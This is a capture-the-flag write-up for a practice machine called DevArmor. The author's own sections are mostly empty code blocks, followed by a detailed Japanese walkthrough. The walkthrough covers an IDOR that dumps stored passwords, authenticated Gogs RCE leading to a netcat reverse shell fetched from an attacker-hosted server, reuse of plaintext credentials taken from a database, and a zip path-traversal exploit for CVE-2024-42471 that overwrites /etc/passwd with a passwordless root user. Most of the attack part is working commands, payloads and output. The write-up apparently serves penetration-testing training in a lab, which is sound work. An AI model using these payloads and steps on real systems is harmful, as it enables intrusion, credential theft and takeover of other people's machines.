---
title: DevArmor
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice]
└─$ sudo nmap -Pn -p- -sSCV -A -oN full_tcp-scan.txt --open 192.168.144.161
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-11 04:20 +0900
Nmap scan report for 192.168.144.161
Host is up (0.080s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 44:53:d3:2b:a3:62:4e:b7:76:8c:a8:0a:6e:a6:eb:99 (ECDSA)
|_  256 50:a1:86:f0:74:b0:32:21:f3:04:e0:3e:b7:a6:16:41 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: DevArmor - devarmor.lab
2222/tcp open  ssh     Golang x/crypto/ssh server (protocol 2.0)
| ssh-hostkey: 
|   3072 82:fc:49:af:f0:97:f0:09:9e:35:91:b4:1c:27:0a:a2 (RSA)
|   256 b4:13:8f:52:5c:3c:40:3e:cd:7b:8c:da:96:4e:7f:f1 (ECDSA)
|_  256 3f:65:93:71:ef:7a:d6:37:91:87:11:9e:e6:fe:f0:62 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 4.15 (91%), Linux 4.15 - 5.19 (91%), Linux 5.0 - 5.14 (91%), Linux 5.14 - 6.8 (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.5 (86%), Crestron XPanel control system (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   79.68 ms 192.168.45.1
2   79.65 ms 192.168.45.254
3   80.49 ms 192.168.251.1
4   81.18 ms 192.168.144.161

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 174.13 seconds
```

# http

![](../../../assets/images/Pasted%20image%2020260611043246.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice]
└─$ curl -X POST http://vault.devarmor.lab/api/register -H "Content-Type: application/json" -d '{}'

{"message":"Missing required fields","missing_fields":["username","password","email"]}
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice]
└─$ curl -X POST http://vault.devarmor.lab/api/register \
-H "Content-Type: application/json" \
-d '{"username":"hacker", "password":"hacker", "email":"hacker@hack.com"}'

{"message":"User created successfully."}
```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

---

# Initial Access

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```
---

# Privilege Escalation

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```

```zsh

```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
DevArmorの悪用ガイド
列挙
まず、Nmapによる簡単なスキャンから列挙プロセスを開始します。

kali@kali:~/# nmap 172.16.73.146
Starting Nmap 7.80 ( https://nmap.org ) at 2025-07-13 16:29 GMT
Nmap scan report for devarmor.lab (172.16.73.146)
Host is up (0.00088s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 4.87 seconds
最初のポートスキャンで、ポート22、80（HTTP）、および2222が開いていることが確認されました。攻撃者として、まずは最も容易な標的、つまりポート80を狙います。ポート80はWebアプリケーションがホストされていることが多いため、初期列挙の出発点として最適です。ポート80で実行されているサービスを調査し、Webアプリケーションの種類を特定し、その機能を調べます。

偵察中に、ウェブサイトのドメインが であることが判明しました。devarmor.labこれは、ホームページの下部にあるサポートメールアドレス から確認support@devarmor.labできます。ドメインをファイルに追加して、適切な名前解決を確保し、サイトの閲覧を続けることができます。調査中に、問い合わせフォームページhttp://devarmor.lab/contact.html/etc/hostsにも別のメールアドレスが見つかりました。メールアドレス が見つかったので、後でエクスプロイトに役立つ可能性があるのでメモしておきます。aryee@devarmor.lab

gobuster静的Webアプリケーションから追加の手がかりが得られなかったため、ターゲットのドメインがわかったので、サブドメインの列挙に進みます。このタスクには、仮想ホスト（）モードのようなツールを利用できますvhost。

kali@kali:~$ gobuster vhost -u http://devarmor.lab -w /snap/seclists/1078/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://devarmor.lab
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /snap/seclists/1078/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: vault.devarmor.lab Status: 302 [Size: 199] [--> /login]
簡単なスキャンの後、新しいサブドメイン（または仮想ホスト）が見つかりましたvault.devarmor.lab。次に、このエントリをファイルに追加して/etc/hosts適切な DNS 解決を有効にし、Web ブラウザを使用して探索に進みます。

搾取
FortiLockの悪用
のウェブアプリケーションにアクセスすると、 FortiLockvault.devarmor.labという名前のアプリケーションのインターフェースが表示され、ログインフォームが表示されます。注目すべきは、新しいアカウントを登録するオプションがないことです。

アプリケーション名（FortiLock）とサブドメイン（vault.devarmor.lab）から判断すると、これは機密情報を保管するための安全な保管庫またはパスワード管理システムである可能性が高いと考えられます。そのため、一般ユーザー向けの登録機能がないのも当然でしょう。アクセスは事前に定義されたユーザーに限定されていると考えられます。

アプリケーションの動作をより深く理解するために、Burp Suiteを使用してHTTPリクエストの傍受を開始します。傍受を有効にした状態で、いくつかの一般的な認証情報またはデフォルトの認証情報を使用してログインを試み、脆弱な認証がないかを確認します。

Burp Suiteでトラフィックを傍受している際に、興味深い点に気づきました。アプリケーションが/api/loginエンドポイントにログイン認証情報を送信しているのです。これは、アプリケーションがバックエンドAPIを公開している可能性が高いことを示しています。

このAPIをさらに詳しく調べるには、総当たり攻撃によるエンドポイント探索を実行して、より多くの機能や脆弱性を明らかにする可能性のある、アクセス可能な他のパスを特定できます。Webferoxbusterファジングツールなどのツールは、このプロセスを自動化し、調査する価値のある追加のAPIエンドポイントを発見するのに役立ちます。

kali@kali:~/# feroxbuster -u http://vault.devarmor.lab/api/ -w /snap/seclists/1078/Discovery/Web-Content/directory-list-2.3-medium.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://vault.devarmor.lab/api/
 🚀  Threads               │ 50
 📖  Wordlist              │ /snap/seclists/1078/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l        2w       23c http://vault.devarmor.lab/api/
405      GET        5l       20w      153c http://vault.devarmor.lab/api/login
405      GET        5l       20w      153c http://vault.devarmor.lab/api/register
302      GET        5l       22w      287c http://vault.devarmor.lab/api/users => http://vault.devarmor.lab/unauthorized?message=Unauthorized:+Token+required
しばらくすると、興味深いエンドポイントが見つかりました。/registerこのエンドポイントは開発者がデバッグ目的で使用していたもので、誤って本番環境にアクセス可能な状態に残された可能性があります。

/registerエンドポイントを利用して新規ユーザーを作成し、有効な認証情報なしでアプリケーションにアクセスできるように試みます。必要なフィールドが最初はわからないため、curl空のJSONボディを持つ最小限のリクエストを送信します。興味深いことに、APIは必要なフィールドが不足していることを示す役立つエラーメッセージを返しました。

kali@kali:~$ curl -X POST http://vault.devarmor.lab/api/register -H "Content-Type: application/json" -d '{}'
↓応答
{"message":"Missing required fields","missing_fields":["username","password","email"]}
この応答により、エンドポイントがアクティブであり、リクエスト本文に、、、、を期待していることが確認されます。これにより、有効な登録リクエストを作成するために必要な情報が正確に得られますusername。passwordemail

この知識を活用して、curlプラットフォーム上で新規ユーザーアカウントを登録するための有効なリクエストを作成します。

kali@kali:~$ curl -X POST http://vault.devarmor.lab/api/register \
-H "Content-Type: application/json" \
-d '{"username":"hacker", "password":"hacker", "email":"hacker@hack.com"}'
{"message":"User created successfully."}
これにより、既存の認証情報を解読したり推測したりすることなく、新しいユーザーを登録し、アプリケーションにアクセスできたことが確認されました。

アカウントの作成が完了したので、新しく登録した認証情報を使用してWebインターフェースからログインできます。これにより、アプリケーションをさらに詳しく調べ、認証済みユーザーに公開される可能性のある機能や機密性の高い機能を確認することができます。

ログインしてみると、このアプリケーションはDevArmorの従業員が認証情報を管理・保存するために使用するパスワードマネージャーであることがわかります。パスワードの作成、共有、整理などの機能が含まれています。

Burp Suiteのプロキシをそのまま使用しながら、HTTPリクエストとレスポンスを分析し、悪用可能な潜在的な脆弱性や設定ミスを特定するために、これらの機能を一つずつ検証し続けます。

まず、パスワード作成機能をテストすることから始めましょう。サイドバーの「パスワードを追加」ボタンをクリックすると、アカウント名、ユーザー名、パスワード、その他のメモなどの詳細を入力するよう求められます。

フォームを送信した後、「パスワードの表示」セクションに移動して、新しいエントリが正しく表示されていることを確認します。これにより、パスワード保存機能が意図どおりに機能していることが確認できます。パスワード作成機能をテストしている間、Burp Suiteでネットワークトラフィックを監視して、API呼び出しとアプリケーションロジックを把握します。ブラウザから次のリクエストが行われていることが確認されました。

GET /api/passwords/8179700e-1702-4dbd-875d-265867919c31 HTTP/1.1
これは、アプリケーションがエンドポイントに付加されたUUIDを使用して個々のパスワードエントリを取得していることを示唆しています。保存されている各パスワードには一意の識別子があり、このUUIDはユーザーごと、エントリごとに異なると考えられます。

HTTPレスポンスを検査すると、現在ログインしているユーザーに関連付けられた保存済みの認証情報という機密情報が明らかになります。この挙動は、UUIDが予測可能または発見可能な場合、他のユーザーの保存済みパスワードへの不正アクセスにつながる可能性があることを示しています。

[
  {
    "date_created": "2025-07-13 18:35:38",
    "date_updated": "2025-07-13 18:35:38",
    "description": null,
    "id": "7c1c1bf3-495c-4a74-9b4a-8f9203c792ce",
    "password": "U7wa%Ht@+!Tl",
    "url": "http://gmail.com",
    "username": "hacker"
  }
]
この挙動は、 IDOR（安全でない直接オブジェクト参照）の脆弱性の可能性を示唆しています。しかし、これだけでは脆弱性を確定するには不十分であり、他のユーザーのデータにアクセスできるかどうかを確認するには、さらなる列挙とテストが必要です。

分析をさらに深めるため、APIとのやり取りを担当するJavaScriptコードを検証します。具体的には、 の行付近fetchPasswords()にある関数を調べます。この関数は、バックエンドからパスワードエントリを取得するためのリクエストを作成して送信するロジックを処理しているようです。/static/js/main.js150

JavaScriptのソースコードから、以下のfetchPasswords()関数を分析できます。

function fetchPasswords() {
  const token = getCookie('token');
  if (!token) {
    window.location.href = '/login';
    return;
  }
  const passwordTableBody = document.getElementById('password-table-body');
  if (passwordTableBody) {
    fetch(`/api/passwords/${userId}`, {
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      }
    })
このコードスニペットから、アプリケーションがエンドポイントuserIdにを追加して/api/passwords/、ユーザーの保存済み認証情報を取得していることがわかります。これは、システムが機密データを取得するためにユーザー固有の UUID を使用しているという、以前から抱いていた疑念を裏付けるものです。

しかし、IDOR（Insecure Direct Object Reference：安全でない直接オブジェクト参照）の脆弱性を確認するには、この動作を特定するだけでは不十分です。別のユーザーIDを使用してエンドポイントにアクセスし、適切な認証チェックが行われているかどうかを確認する必要があります。サーバーがトークン所有者とユーザーIDの関係を検証せずに別のユーザーのデータで応答した場合、IDORの脆弱性が存在することが確認できます。

現在の課題は、アプリケーションがユーザー識別子としてUUIDを使用していることです。UUIDは容易に推測できるものではありません。IDORの脆弱性を確認するには、プラットフォーム上の別のユーザーのUUIDを取得する必要があります。そのため、アプリケーションの機能を引き続き調査し、ユーザーIDを漏洩させるために悪用できる可能性のある機能を探しています。

特筆すべき機能の一つは、パスワード共有機能です。

この機能を使うと、組織内の他の登録ユーザーと保存済みのパスワードを共有できます。共有には、受信者のメールアドレスを知っている必要があります。幸いなことに、有効なメールアドレス（自分のメールアドレス）は既に分かっているので、まずは自分のアカウントを使ってこの機能をテストしてみましょう。

パスワードを共有しようとすると、まずメールアドレスを入力して「メールアドレスを確認」ボタンをクリックする必要があります。これにより、共有操作を許可する前に、ユーザーが存在するかどうかを確認するためのバックエンドへのリクエストがトリガーされます。

Burp Suiteでこのリクエストを傍受し、メールがバックエンドAPIに送信されていることを確認しました。サーバーは、ユーザーのUUIDを含む、ユーザーに関する詳細情報を返信します。

{
  "email": "hacker@hack.com",
  "id": "8179700e-1702-4dbd-875d-265867919c31"
}
これは、既知の登録済みメールアドレスのUUIDを事実上漏洩させるものであり、極めて重要な発見です。aryee@devarmor.lab以前お問い合わせページで見つけたメールアドレス（例：）を入力することで、そのユーザーのUUIDを抽出し、IDORの脆弱性をテストするために利用できる可能性があります。

GET /api/users?email=aryee%40devarmor.lab HTTP/1.1
{
  "email": "aryee@devarmor.lab",
  "id": "687d1145-5c7c-44e7-b443-c11dd2075a2d"
}
パスワード共有機能における情報漏洩の脆弱性を利用することで、ユーザーのユーザーID（UUID）を取得できますaryee。このUUIDを入手することで、以前疑われていたIDORの脆弱性を改めて検証できます。

/api/passwords/{user_id}のUUIDを使用してエンドポイントに直接リクエストを送信することでaryee、アクセス制御が適切に適用されているかどうかを確認できます。別のユーザーとして認証されているにもかかわらず、サーバーがのパスワードエントリを返す場合、 IDORの脆弱性aryeeが存在することが確認され、他のユーザーの機密情報への不正アクセスが可能になります。

GET /api/passwords/687d1145-5c7c-44e7-b443-c11dd2075a2d HTTP/1.1
[
  {
    "date_created": "2025-07-13 16:23:25",
    "date_updated": "2025-07-13 16:23:25",
    "description": "Password to gogs application",
    "id": "c46af40f-2b4d-417c-9607-ea688fbf1936",
    "password": "l3tmE1nt0th1s4ppl1cAti0N2025!",
    "url": "http://gogs.devarmor.lab",
    "username": "aryee"
  },
  {
    "date_created": "2025-07-13 16:23:25",
    "date_updated": "2025-07-13 16:23:25",
    "description": "Password to DevArmor Email Application",
    "id": "fa4d0e21-5289-48b3-be0b-2e57ef87708d",
    "password": "e7ccde2d",
    "url": "http://mail.devarmor.lab",
    "username": "aryee"
  }
]
APIレスポンスから、興味深い情報がいくつか明らかになりました。まず、新しいサブドメイン「」が見つかりました。http://gogs.devarmor.labこれは、自己ホスト型のGitサービスをホストしているようです。

さらに、この応答にはユーザーの認証情報が含まれています。

ユーザー名: aryee
パスワード： l3tmE1nt0th1s4ppl1cAti0N2025!
これらの認証情報は、おそらく新たに発見されたサブドメイン向けのものと思われますgogs.devarmor.lab。このサービスを詳しく調べるには、サブドメインをファイルに追加し/etc/hosts、ブラウザでそのサブドメインにアクセスします。

ゴグを悪用する
新たに発見されたサブドメインを閲覧したところ、軽量なセルフホスト型GitサービスであるGogsgogs.devarmor.labサーバーが稼働していることがわかりました。これはDevArmorが内部的にソースコードリポジトリを管理・保存するために使用しているようです。

以前に取得した認証情報（aryee / l3tmE1nt0th1s4ppl1cAti0N2025!）を使用して、Gogsインスタンスにログインを試みます。すると、ログインに成功しました。ユーザーとしてアプリケーションへのアクセスに成功しましたaryee。

次のステップは、実行中の Gogs のバージョンが、公開されている概念実証コードを使用して既知の脆弱性に対して脆弱であるかどうかを確認することです。これを行うには、 の管理ページに移動します/admin。これにより、サーバーがGogs v0.13.0を実行していることがわかります。

調査の結果、Exploit-DB で関連するエクスプロイトが見つかりました: 🔗 https://www.exploit-db.com/exploits/52348

このエクスプロイトはGogs v0.13.0を標的としており、有効なユーザー認証情報が必要です。私たちは既にそれを所有しています ( aryee / l3tmE1nt0th1s4ppl1cAti0N2025!)。

エクスプロイトを実行する前に、いくつかの前提条件を満たす必要があります。

SSHキーペア： このエクスプロイトには、公開SSHキーと秘密SSHキーの両方が必要です。以下のコマンドを使用して新しいキーペアを生成できますssh-keygen。
kali@kali:~$ ssh-keygen -t rsa -b 2048 -f gogs_rsa
SSHサーバーポート: Gogs SSHサーバーが実行されているポートを特定する必要があります。http ://gogs.devarmor.lab/admin/configのGogs管理設定ページにアクセスして、SSHサーバーがポートでリッスンしていることを確認します2222。
有効なGogs認証情報、SSHキーペア、SSHサーバーポートの知識など、必要な前提条件がすべて揃ったら、エクスプロイトを実行します。

ステップ1：逆殻を準備する
まず、リバースシェルペイロードをローカルファイルに書き込みます。このシェルは、ターゲット上で実行されると、リスナーに接続します。

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 172.16.73.1 2222 >/tmp/f' > shell.sh
172.16.73.1 を攻撃用マシンの IP アドレスに置き換えてください。

お使いのマシンが指定されたポートでリッスンしていることを確認してください。

kali@kali:~$ nc -lvnp 2222
ステップ2：HTTPサーバーを準備する
HTTPサーバーがポート80で実行され、リバースシェル（）が存在するディレクトリで起動されていることを確認してくださいshell.sh。

kali@kali:~$ sudo python -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
ステップ3：エクスプロイトを実行してシェルをダウンロードします
まず、リバースシェルファイルをターゲットに転送する必要があります。

kali@kali:~$ python3 52348.py http://gogs.devarmor.lab 'aryee:l3tmE1nt0th1s4ppl1cAti0N2025!' ./id_rsa ./id_rsa.pub "wget http://172.16.73.1/shell.sh" --ssh-port 2222
[+] API Token Acquired: 4c8b7eecfcb138c48285678d74f02bea0c8b4b9a
[+] Repository Created: aryee/RG9SPImp
[+] SSH Key Added: 201
[+] Executing command...... 
すると、HTTPサーバーへの呼び出しが発生します。

kali@kali:~$ sudo python -m http.server 80
[sudo] password for kali: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.16.73.146 - - [13/Jul/2025 19:50:44] "GET /shell.sh HTTP/1.1" 200 -
ステップ4：リバースシェルを実行してコールバックを取得します
kali@kali:~$ python3 52348.py http://gogs.devarmor.lab 'aryee:l3tmE1nt0th1s4ppl1cAti0N2025!' ./id_rsa ./id_rsa.pub "bash shell.sh" --ssh-port 2222
[+] API Token Acquired: a1020a5bed236f2e152cb32825026c41b902583b
[+] Repository Created: aryee/kK1CFUdg
[+] Deleted SSH Key ID: 2
[+] SSH Key Added: 201
[+] Executing command...... 
そして、ほら、ユーザーとしてシェルを取得できましたgit。

kali@kali:~$ nc -lnvp 2222
Listening on 0.0.0.0 2222
Connection received on 172.16.73.146 40308
bash: cannot set terminal process group (13592): Inappropriate ioctl for device
bash: no job control in this shell
git@DevArmor:/opt/gogs/gogs$ id
uid=1002(git) gid=1002(git) groups=1002(git)
特権の拡大
mcsamユーザーへの権限昇格
ターゲットマシンへの初期アクセスを取得した後、基本的なポストエクスプロイト列挙を開始します。このプロセス中に、システム上に別のユーザーが存在することを発見しますmcsam。

実行中のプロセスを列挙する
システムの実行中のプロセスを調査したところ、FortiLockアプリケーションがアクティブであることが確認できました。特に注目すべきは、アプリケーションを実行するPythonファイルへのフルパスが判明したことです。これは、コードレビューやソースコードレベルでの攻撃を行う上で貴重な手がかりとなります。興味深いことに、FortiLockアプリケーションはユーザーによって実行されていることが分かりましたmcsam。

git@DevArmor:/opt/gogs/gogs$ ps aux
...
mcsam      10860  0.4  4.0 542088 37704 ?        Ss   16:23   1:25 python3 /opt/fortilock_vault/app.py
アプリケーションソースの調査
アプリケーションのPythonソースファイルへのパスが分かり、かつそれがmcsamユーザー権限で実行されていることが分かったので、ソースディレクトリに移動してその内容を調べます。

git@DevArmor:/opt/fortilock_vault$ ls -la
total 72
drwxrwxr-x 7 mcsam mcsam  4096 Jul 13 18:35 .
drwxr-xr-x 4 root  root   4096 Jul 13 16:25 ..
-rw-rw-r-- 1 mcsam mcsam  1504 Jul 12 18:42 app.py
drwxrwxr-x 3 mcsam mcsam  4096 Jul 13 16:23 database
-rw-r--r-- 1 mcsam mcsam 32768 Jul 13 18:35 database.db
-rw-rw-r-- 1 mcsam mcsam    77 Jul  4 16:40 .env
-rw-rw-r-- 1 mcsam mcsam   143 Jul 11 13:44 requirements.txt
drwxrwxr-x 3 mcsam mcsam  4096 Jul 13 16:23 routes
drwxrwxr-x 6 mcsam mcsam  4096 Jul  4 15:14 static
drwxrwxr-x 3 mcsam mcsam  4096 Jul  8 12:08 templates
drwxrwxr-x 3 mcsam mcsam  4096 Jul 13 16:23 utils
ソースディレクトリを調査したところ、 FortiLockアプリケーションに関連付けられたSQLiteデータベースファイルが見つかりました。これはすぐに私たちの注意を引きました。なぜなら、以前のIDOR攻撃の試みでは、ユーザーの保存済みパスワードしか取得できなかったからですaryee。これは、事前にユーザーのメールアドレスを知っていたためaryee、ユーザーIDが漏洩したことによって可能になりました。

他のユーザー（例えばmcsam、）もこのデータベースに認証情報を保存している可能性が非常に高い。システムとデータベースファイルへのローカルアクセスが可能になったため、Webアプリケーションの制限を回避し、データベースに保存されているすべてのデータを直接抽出できる。

git@DevArmor:/opt/fortilock_vault$ sqlite3 database.db 
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
shared_passwords  users             vault           
sqlite> .schema vault
CREATE TABLE vault (
                id TEXT PRIMARY KEY,
                user_id TEXT,
                username TEXT,
                password TEXT,
                url TEXT,
                description TEXT,
                shared_by TEXT,
                date_created TEXT NOT NULL,
                date_updated TEXT NOT NULL
            );
sqlite> select username, password from vault;
mcsam|cfced346
mc_sam|27beb508
mcsam|d3vs3c0ps2025
caeser1990|22f0d2e3
caeser|09b8daf5
aryee|l3tmE1nt0th1s4ppl1cAti0N2025!
aryee|e7ccde2d
hacker|U7wa%Ht@+!Tl
SQLiteデータベースにアクセスし、保存されているすべてのパスワードを抽出してエントリを確認しました。その中に、異なるユーザーに属していると思われる複数の認証情報が見つかりました。

mcsam対象システム上で既にユーザーを特定済みであるため、このアカウントの復元されたパスワードを試します。いくつかのオプションを試した結果、mcsam以下の認証情報を使用して認証に成功しました。

ユーザー名: mcsam
パスワード： d3vs3c0ps2025
これにより、より特権的なユーザーアカウントでシステムへの追加の足がかりが得られ、さらに権限を昇格させたり、が所有する機密ファイルにアクセスしたりすることが可能になりますmcsam。

git@DevArmor:/opt/fortilock_vault$ su mcsam
Password: 
mcsam@DevArmor:/opt/fortilock_vault$ id
uid=1001(mcsam) gid=1001(mcsam) groups=1001(mcsam)
rootユーザーへの権限昇格
権限昇格の最初のステップの1つは、現在のユーザーのsudo権限を確認することです。mcsamアカウントに切り替えた後、次のコマンドを実行します。

mcsam@DevArmor:/tmp$ sudo -l
Matching Defaults entries for mcsam on DevArmor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, !env_reset

User mcsam may run the following commands on DevArmor:
    (root) NOPASSWD: /usr/bin/backup-manager
これは非常に重要な発見です。なぜなら、backup-managerこれはバックアップの作成と管理によく使用されるシステムユーティリティであり、設定が誤っていたり、安全でない機能があったりすると、ルート権限を取得するために悪用される可能性があるからです。

のファイル権限を確認すると、/usr/bin/backup-managerそれが へのシンボリックリンクであることがわかります/opt/devarmor_backup_manager/zip-backup.js。

mcsam@DevArmor:/tmp$ ls -la /usr/bin/backup-manager
lrwxrwxrwx 1 root root 42 Jul 15 18:43 /usr/bin/backup-manager -> /opt/devarmor_backup_manager/zip-backup.js
スクリプトの最初の数行を確認するとbackup-manager、Node.js パッケージ に依存していることがわかりますunzip-stream。package.jsonファイルを調べると、使用されているバージョンは であることが確認できます0.3.1。

簡単な調査で、このunzip-streamバージョンにはファイル上書きの脆弱性0.3.1（CVE-2024-42471）が存在することが判明しました。この脆弱性により、攻撃者はZIPファイルのエントリ内でパストラバーサル技術を用いて、本来の展開ディレクトリ外にファイルを書き込むことが可能になります。

さらなる調査の結果、脆弱性のあるunzip.Extract()関数がスクリプト内backup-manager、具体的には特定の関数内で実際に使用されていることが判明しました。つまり、この脆弱性を悪用することで、ユーティリティが悪意のあるZIPアーカイブを解凍するviewZipContents()際に、システム上の重要なファイルを上書きすることが可能です。backup-manager

その後、CVE-2024-42471に対する公開されたエクスプロイトを発見しました。これは、任意のファイル書き込みを可能にするZIPファイルを作成する方法を示しており、root権限への昇格に絶好の機会となります。

簡単な検索の結果、Exploit DB（ https://www.exploit-db.com/exploits/52276 ）にこの脆弱性を悪用できるエクスプロイトが見つかりました。このエクスプロイトに少し手を加えるだけで、すぐに実行できます。

この脆弱性を悪用するために、ルートアクセス権限を取得する悪意のある変更によって重要なシステムファイルを上書きすることを目標とします。私たちは/etc/passwd、ユーザーアカウントの設定を制御するファイルをターゲットに選びました。

ステップ1：オリジナルをコピーする/etc/passwd
/etc/passwdまず、対象システムから既存のファイルのローカルコピーを作成します。

mcsam@DevArmor:/tmp$ cat /etc/passwd > /tmp/passwd
次に、このコピーをローカルマシンに転送して修正します。

ステップ2：悪意のあるルートユーザーのエントリを追加する
次に、passwd ファイルの末尾に次の行を追加して、root 権限を持つがパスワードのない新しいユーザーを追加します。

kali@kali:~$ echo "root2::0:0:root2:/root:/bin/bash" >> passwd
ステップ4：エクスプロイトを修正して悪意のあるZIPファイルを作成する
変更済みのpasswdファイルが準備できたら、悪意のあるZIPファイルを作成します。このZIPファイルは、脆弱性のあるライブラリによって解凍されると、ターゲットシステムのunzip-stream実際のファイルを上書きします。/etc/passwd

私たちはCVE-2024-42471に対して、一般に公開されているエクスプロイトを使用します。

import zipfile
import os
import sys

file_path = './passwd' # Change to the file which contains the data to write
zip_name = 'evil.zip'
path_to_overwrite_file = 'etc/passwd' # Change to target file to write/overwrite

if not os.path.isfile(file_path):
    print(f"Error: File '{file_path}' does not exist.")
    sys.exit()

with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipf.write(file_path, \
    arcname=f'backups/../../../../../../../../../../../../../../{path_to_overwrite_file}')
    print(f"File '{file_path}' has been zipped as '{zip_name}'.")
保存して実行してください。すると、evil.zip というファイルが生成されます。このファイルをターゲットマシンに転送し、指定された/tmpディレクトリに配置します。

kali@kali:~$ python3 52276.py
File './passwd' has been zipped as 'evil.zip'.
ステップ5：脆弱性の悪用
evil.zipターゲットシステムに転送した後、プログラムを実行します。まず、オプション 1/usr/bin/backup-managerを選択してZIP ファイルをディレクトリにバックアップします。次に、オプション 3を選択して、入力して悪意のある ZIP ファイルの名前 ( ) を指定することで、その内容を表示します。/root/backups3evil.zip

mcsam@DevArmor:/tmp$ sudo /usr/bin/backup-manager
==============================================================
      Welcome to the DevArmor LLC Backup Manager
==============================================================
This tool allows you to securely manage zip file backups for
DevArmor LLC. You can back up zip files, list existing backups,
view the contents of backed-up zip files, or retrieve backups.
All operations are performed securely in the designated backups directory.
For support, contact DevArmor LLC IT at support@devarmor.lab
==============================================================


What would you like to do?
1. Backup a zip file
2. List zip files in backup directory
3. View contents of a zip file
4. Retrieve a backup file
5. Exit
Enter your choice (1-5): 1
Enter the full or relative path to the zip file: /tmp/evil.zip
Successfully backed up evil.zip to /root/backups

What would you like to do?
1. Backup a zip file
2. List zip files in backup directory
3. View contents of a zip file
4. Retrieve a backup file
5. Exit
Enter your choice (1-5): 3
Enter the name of the zip file in the backups directory (e.g., example.zip): evil.zip
Extracting evil.zip to temporary directory: /root/backups/temp-extract-RY35Tz
Contents of evil.zip:
Finished reading zip contents.
Cleaned up temporary directory: /root/backups/temp-extract-RY35Tz

What would you like to do?
1. Backup a zip file
2. List zip files in backup directory
3. View contents of a zip file
4. Retrieve a backup file
5. Exit
Enter your choice (1-5): 5
Exiting DevArmor LLC Backup Manager...
抽出処理を実行した後、変更内容が反映されます。これで、パスワードなしで/etc/passwd新しく追加されたユーザーとしてログインできます。root2

mcsam@DevArmor:/tmp$ su root2
root@DevArmor:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

</details>